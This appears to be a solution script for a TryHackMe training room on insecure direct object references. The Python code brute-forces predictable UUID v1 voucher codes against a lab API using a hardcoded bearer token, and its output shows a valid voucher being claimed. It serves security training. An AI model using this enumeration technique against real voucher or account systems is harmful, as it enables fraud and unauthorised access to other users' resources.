#  TryHackMe: room url -> https://tryhackme.com/room/idor-aoc2025-zl6MywQid9
# generating UUID v1 to find the voucher that is valid on 20 November 2025
# url: http://ip:port/api/parents/vouchers/claim
# request: {"code":"37f0010f-a489-11f0-ac99-026ccdf7d769"}, response: {"voucher_id":21,"code":"37f0010f-a489-11f0-ac99-026ccdf7d769","extra_count":1,"created_at":"2025-10-08T20:56:10+00:00"}
# Node: 026ccdf7d769 # fixed
# Date: 2025-11-20, Time window: 20:00–23:59, Precision: minute, UUID version: 1

import uuid
from datetime import datetime, timezone, timedelta
import requests



BASE_URL = "http://10.66.185.51:80/api/parents/vouchers/claim"
headers = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEwLCJyb2xlIjoxLCJleHAiOjE3NjU4MDQ4OTB9.lFgSW_xeD--iCL1CqbcqRC3cudgklDD0dBJYnrJnjtU",
    "Accept": "application/json"
}

with open("uuids.txt", 'r') as f:
	text = [line.strip() for line in f]

	for uuid in text:
		paylaod = {"code":str(uuid)}
		print(f"testing uuid -> {paylaod}")
		r = requests.post(BASE_URL, json=paylaod, headers=headers)

		if r.status_code !=200:
			continue
		data = r.json()
		print("Valid UUID: ", data)
		break


"""
result: 
testing uuid -> {'code': '22643e00-c655-11f0-ac99-026ccdf7d769'}
Valid UUID:  {'voucher_id': 22, 'code': '22643e00-c655-11f0-ac99-026ccdf7d769', 'extra_count': 1, 'created_at': '2025-10-10T10:24:14+00:00'}


"""
